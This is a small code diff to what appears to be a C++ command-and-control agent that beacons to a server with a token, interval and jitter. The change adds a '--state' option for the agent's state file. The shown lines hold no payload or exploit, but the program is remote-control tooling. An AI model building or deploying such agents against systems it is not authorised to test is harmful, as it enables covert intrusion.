@@ -150,7 +150,10 @@ static std::string get_username() {
 #endif
 }
 
+static std::string g_state_override;   /* --state FILE */
+
 static std::string state_path() {
+    if (!g_state_override.empty()) return g_state_override;
     const char *home = getenv(HOME_ENV);
     if (!home) home = ".";
     return std::string(home) + PATH_SEP + ".c2agent_cpp.json";
@@ -1578,6 +1581,8 @@ int main(int argc, char *argv[]) {
             g_interval = atoi(argv[++i]);
         else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc)
             g_jitter = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--state") == 0 && i + 1 < argc)
+            g_state_override = argv[++i];
         else if (strcmp(argv[i], "--verbose") == 0)
             g_verbose = true;
     }
@@ -1587,7 +1592,7 @@ int main(int argc, char *argv[]) {
     if (!g_token_buf[0])  { const char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token_buf, e, sizeof(g_token_buf) - 1); }
 
     if (!g_server_buf[0] || !g_token_buf[0]) {
-        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]\n");
+        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
         return 1;
     }
 
